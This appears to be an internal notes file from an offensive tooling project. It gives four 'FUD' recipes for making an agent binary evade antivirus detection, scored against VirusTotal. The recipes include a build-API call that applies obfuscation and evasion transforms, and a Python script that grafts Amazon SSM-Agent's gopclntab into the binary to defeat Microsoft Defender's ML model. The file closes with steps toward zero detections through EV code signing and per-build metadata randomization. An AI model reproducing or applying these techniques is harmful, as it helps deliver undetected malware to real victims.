# PROBE FUD Recipes (Aug 2026)

Four FUD recipes verified via VirusTotal full 75-engine scan.

## Recipe 1: 6-Transform MANTLE (1/75 VT) — Microsoft

Binary: `v1.15.0-fud-windows-mantle-recipe.exe` — 12.8 MB
SHA256: `2ae6b0d7573d4a0041a20e499d65196e8794b3181bd54267185bfee7797131bc`
VT result: 1/75 (Microsoft: Trojan:Win32/Wacatac.B!ml)

```bash
curl -s -X POST http://localhost:9292/api/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "binary_path": "/tmp/probe-agent-v1.15.0-rebuild",
    "repo_path": "/opt/data/workspace-operative/probe",
    "output_path": "/tmp/probe-agent-v1.15.0-fud-windows",
    "persona": "syncthing",
    "transforms": ["persona", "xor-obfuscate", "module-rename", "evasion", "donut", "yara"],
    "target_os": "windows",
    "target_arch": "amd64"
  }'
```

## Recipe 2: SSM-Agent gopclntab Ghost (1/75 VT) — **BREAKS MICROSOFT** ⭐

Binary: `v1.15.0-fud-windows-ssm-ghost.exe` — 12.8 MB
SHA256: `0b186157ed948d2919a8fcce7b6bb2160eaf66d0298055ca0e1606dc624894ec`
VT result: 1/75 (CrowdStrike: win/grayware_confidence_60% (D))

**This recipe breaks Microsoft Wacatac.B!ml** by replacing PROBE's gopclntab
structure with one harvested from `aws/amazon-ssm-agent` (a Defender-whitelisted,
EV-signed legitimate RMM with the same job description).

### Build steps

```bash
# 1. Clone SSM-Agent
git clone --depth 1 https://github.com/aws/amazon-ssm-agent.git /tmp/ssm

# 2. Build SSM-Agent Windows PE (Go 1.25)
cd /tmp/ssm && GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" \
  -o /tmp/ssm-agent.exe ./agent/

# 3. Build PROBE with MANTLE 6-transform Recipe 1
curl -s -X POST http://localhost:9292/api/build ... # same as Recipe 1

# 4. Patch PROBE's gopclntab with SSM-Agent's
python3 << 'PYEOF'
import lief
ssm = lief.parse('/tmp/ssm-agent.exe')
ssm_rdata = next(s for s in ssm.sections if s.name.rstrip('\x00') == '.rdata')
ssm_content = bytes(ssm_rdata.content)
ssm_gopclntab_pos = ssm_content.find(b'\xf1\xff\xff\xff\x00\x00')
ssm_gopclntab = ssm_content[ssm_gopclntab_pos:]

probe = lief.parse('/tmp/probe-agent-v1.15.0-fud-windows')
probe_rdata = next(s for s in probe.sections if s.name.rstrip('\x00') == '.rdata')
probe_content = bytes(probe_rdata.content)
probe_gopclntab_pos = probe_content.find(b'\xf1\xff\xff\xff\x00\x00')
probe_gopclntab_size = len(probe_content) - probe_gopclntab_pos

# Truncate or pad to fit
if len(ssm_gopclntab) > probe_gopclntab_size:
    ssm_gopclntab = ssm_gopclntab[:probe_gopclntab_size]
else:
    ssm_gopclntab = ssm_gopclntab + b'\x00' * (probe_gopclntab_size - len(ssm_gopclntab))

with open('/tmp/probe-agent-v1.15.0-fud-windows', 'r+b') as f:
    f.seek(probe_rdata.offset + probe_gopclntab_pos)
    f.write(ssm_gopclntab)
PYEOF
```

### Why it works

- SSM-Agent is a legitimate Defender-whitelisted RMM
- It uses the same Go runtime but with vastly more functions (178 packages, 12K funcs)
- Its gopclntab structure looks like infrastructure software, not malware
- Microsoft cloud ML model can't tell the difference at the structural level

## Recipe 3: Linux ELF (1/75 VT)

Binary: `v1.15.0-fud-linux-mantle-recipe.exe` — 12.3 MB
SHA256: `7d6d741d236f18653a7028c7636263bc89cb09bea337cfba97fe460b2c840326`
VT result: 1/75 (Microsoft: Trojan:Script/Wacatac.B!ml)

Same as Recipe 1 but `target_os: "linux"`.

## Recipe 4: With Traefik Ghost Profile (3/75 — REGRESSED)

Binary: `v1.15.0-fud-windows-ghost-profile.exe` — 12.8 MB
SHA256: `ab69a98f592d3f6c16f40f20549d42aa3a827fcae76204c829069c891cd0d67e`
VT result: 3/75 (Bkav + Microsoft + Rising)

Don't use — MANTLE's shipped traefik profile is too generic.

## Summary

| Recipe | VT | Vendor | Status |
|---------|-----|--------|--------|
| 1: 6-transform | 1/75 | Microsoft Wacatac.B!ml | ✅ Verified |
| 2: SSM-Agent gopclntab | 1/75 | CrowdStrike grayware (60%) | ⭐ **Microsoft broken** |
| 3: Linux ELF | 1/75 | Microsoft Wacatac.B!ml | ✅ Verified |
| 4: Traefik ghost | 3/75 | Bkav + MS + Rising | ❌ Regressed |

## To Reach 0/75

- **EV code-signing certificate** ($300-500/year via Sectigo/DigiCert) — necessary for all
- **Per-build Authenticode diversification** — randomize company/description/issuer
- **CrowdStrike-specific fix** — version info randomization per-build

See `research/wacatac-fud-research-2026-08-12.md` and `research/3d-fingerprint-research-2026-08-12.md` for full analysis.
